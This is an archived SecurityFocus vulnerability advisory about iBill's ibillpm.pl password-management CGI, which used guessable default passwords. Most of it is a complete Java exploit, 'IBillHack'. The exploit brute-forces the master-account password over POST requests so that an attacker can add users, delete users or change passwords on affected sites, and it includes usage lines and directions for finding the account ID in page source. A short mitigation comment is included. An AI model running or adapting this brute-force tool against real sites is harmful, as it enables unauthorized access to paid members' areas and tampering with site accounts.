source: http://www.securityfocus.com/bid/3476/info

iBill is an Internet billing company that provides secure payment processing for e-commerce.

A vulnerability exists in iBill's CGI password management script called ibillpm.pl. The default password is the client's MASTER_ACCOUNT name plus two lower case letters. The MASTER_ACCOUNT name can be determined by viewing the HTML source of the site's sign-up pages. 

// 10/25/2001

import java.net.*;
import java.io.*;

/**
* IBillHack class for informational purposes only.
* This program brute-forces POST requests to the iBill Password Management CGI
* and allows us to add/delete usernames and change passwords on websites 
* that used iBill Password Management using default installation.
* By default iBill sets up the $authpwd as MASTER_ACCOUNTxx, where "xx" 
* is a pair of letters [a-z]. It is suggested that all clients of iBill 
* that use Password Management aquire a new $authpwd for their ibillpm.pl 
* script.
* MASTER_ACCOUNT can be found as part of the <FORM> tag on the signup pages:
* <input type="hidden" name="account" value="123456-500">
* OR
* <input type="hidden" name="account" value="123456500">
* The last 3 digits is the sub-account, and somtimes there is a dash, 
* sometimes not. In this case MASTER_ACCOUNT=123456.
*
* /cgi-bin/ibillpm.pl is the default path to the CGI. Sometimes the webmaster 
* is smart enough not to use the default and request that $authpwd be changed
* to something more secure. In addition to these measures, a webmaster can 
* also modify their httpd.conf to only allow iBill IP addresses to request 
* the Password Management CGI script.
* 
* The correct $authpwd is not saved here. That is an optional exercise for 
* the reader. 
*
* Here are the return codes from the ibillpm.pl script (not HTTP status codes) 
* and their meaning:
* 
* 501 - authentication failed
* 502 - invalid request type (command must be add, delete, or chgpwd)
* 503 - failed to locate the password file
* 504 - failed to open the password file
* 505 - specified user already exists
* 506 - specified user doesn't exist
* 507 - invalid username
* 508 - invalid password
*
* 201 - add user success
* 202 - delete user success
* 203 - change password success
*
*/

public class IBillHack {

    public static void main(String args[]) {
        if (args.length != 6) {
            System.err.println("Usage: java IBillHack <target_hostname> </path/to/cgi-bin/ibillpm.pl> " + 
                        "<add|delete|chgpwd> <username> <password> <master_account>");
            System.err.println("Example: java IBillHack www.somesite.com /cgi-bin/ibillpm.pl add bob 1pass 123456");
            System.exit(1);
        } 

        char letters[] = {
            'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 
            'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z'
        };

        for (int i = 0; i < letters.length; i++) {
            for (int j = 0; j < letters.length; j++) {
                try {
                    Socket s = new Socket(InetAddress.getByName(args[0]), 80);
                    StringBuffer headers = new StringBuffer();

                    headers.append("POST " + args[1] + " HTTP/1.1\n");
                    headers.append("Referer: http://" + args[0] + args[1] 
                                   + "\n");
                    headers.append("Content-Type: application/x-www-form-urlencoded\n");
                    headers.append("User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.0)\n");
                    headers.append("Host: " + args[0] + "\n");

                    StringBuffer query = new StringBuffer();

                    query.append("\nauthpwd=" + args[5] + letters[i] 
                                 + letters[j] + "&reqtype=" + args[2] 
                                 + "&username=" + args[3] + "&password=" 
                                 + args[4] + "&submit=Submit\n");

                    String q = query.toString();

                    headers.append("Content-Length: " + q.length() + "\n");

                    OutputStream os = 
                        new BufferedOutputStream(s.getOutputStream());

                    os.write(headers.toString().getBytes());
                    os.write(q.getBytes());
                    os.flush();

                    System.err.println("Sending...");
                    System.out.print(headers.toString());
                    System.out.println(q);

                    s.close();

                    Thread.sleep(500);
                } catch (Exception e) {
                    e.printStackTrace();
                } 
            } 
        } 

		System.err.println("--------------------------------------------------------------------");
		System.err.println("Finished trying all aa-zz combinations for MASTER_ACCOUNT " + args[5]);
		System.err.println("Try logging into the members section of " + args[0] + " with username/password " + args[3] + "/" + args[4]);
		System.err.println("--------------------------------------------------------------------");
    } 

}